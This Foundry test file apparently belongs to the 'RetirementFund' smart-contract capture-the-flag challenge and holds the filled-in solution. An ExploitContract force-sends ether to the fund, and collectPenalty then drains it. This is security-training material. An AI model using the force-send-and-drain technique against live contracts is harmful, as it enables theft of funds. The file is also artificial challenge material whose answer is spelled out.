// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/RetirementFund.sol";

contract RetirementFundTest is Test {
    RetirementFund public retirementFund;
    ExploitContract public exploitContract;

    address owner = makeAddr("owner");

    function setUp() public {
        // Deploy contracts
        vm.deal(owner, 1 ether);

        vm.prank(owner);
        retirementFund = (new RetirementFund){value: 1 ether}(address(this));
        exploitContract = new ExploitContract(retirementFund);
    }

    function testIncrement() public {
        vm.deal(address(exploitContract), 1 ether);
        // Test your Exploit Contract below
        // Use the instance retirementFund and exploitContract

        // Put your solution here
        exploitContract.forceSendEther(address(retirementFund));
        retirementFund.collectPenalty();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(retirementFund.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}